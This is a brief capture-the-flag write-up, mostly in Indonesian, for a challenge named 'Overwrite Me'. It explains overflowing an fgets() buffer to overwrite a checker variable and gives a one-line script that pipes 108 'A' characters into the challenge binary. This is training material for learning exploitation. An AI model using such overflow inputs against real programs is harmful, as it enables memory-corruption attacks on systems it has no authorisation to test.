# Overwrite Me
---
There's no way you can overwrite my checker variable, right?

nc challenges.traboda.com 8023
# Solver
---
Diberikan sebuah file .c dan binarynya kita harus meng overwrite variabel ```value``` menjadi 1. Terdapat Bug pada ```fgets()``` sehingga kita dapat meng overflow dan mengubah variabel ```value``` menjadi 1 dengan script
```
#!/bin/bash
python -c "print 'A' * 108" | ./chall.chall

```